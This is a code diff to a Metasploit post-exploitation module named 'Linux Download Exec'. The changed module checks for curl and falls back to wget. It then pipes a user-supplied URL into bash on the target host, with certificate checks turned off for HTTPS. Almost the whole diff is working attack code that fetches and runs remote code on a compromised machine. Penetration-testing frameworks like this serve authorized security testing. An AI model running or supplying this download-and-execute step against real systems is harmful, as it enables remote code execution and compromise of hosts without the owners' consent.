@@ -23,7 +23,7 @@ class Metasploit3 < Msf::Post
 		super( update_info( info,
 			'Name'          => 'Linux Download Exec',
 			'Description'   => %q{
-				This module downloads and runs a file with bash. It uses curl and bash from the PATH.
+				This module downloads and runs a file with bash. It first tries to uses curl and then wget if it's not found to download and bash to execute from the PATH.
 			},
 			'License'       => MSF_LICENSE,
 			'Author'        =>
@@ -42,7 +42,7 @@ class Metasploit3 < Msf::Post
 	end
 
 	def exists_exe?(exe)
-		path = expand_path("$PATH")
+		path = expand_path(ENV['PATH'])
 		if path.nil? or path.empty?
 			return false
 		end
@@ -55,18 +55,30 @@ class Metasploit3 < Msf::Post
 	end
 
 	def run
+		stdout_option = ""
 		print_status("Checking if curl exists in the path...")
 		if exists_exe?("curl")
 			print_good("curl available, going ahead...")
+			http_client = "curl"
+			ssl_option = "-k"
 		else
-			print_warning("curl not available on the $PATH, aborting...")
+			print_warning("curl not available on the $PATH, checking for wget...")
+			print_status("Checking if wget exists in the path...")
+			if exists_exe?("wget")
+				print_good("wget available, going ahead...")
+				http_client = "wget"
+				stdout_option =  "-O-"
+				ssl_option = "--no-check-certificate"
+			else
+				print_warning("neither curl nor wget available in the $PATH, aborting...")
 			return
+			end
 		end
 
 		if datastore['URL'].match(/https/)
-			cmd_exec_vprint("`which curl` -k #{datastore['URL']} 2>/dev/null | `which bash` ")
+			cmd_exec_vprint("`which #{http_client}` #{stdout_option} #{ssl_option} #{datastore['URL']} 2>/dev/null | `which bash` ")
 		else
-			cmd_exec_vprint("`which curl` #{datastore['URL']} 2>/dev/null | `which bash` ")
+			cmd_exec_vprint("`which #{http_client}` #{stdout_option} #{datastore['URL']} 2>/dev/null | `which bash` ")
 		end
 	end
 
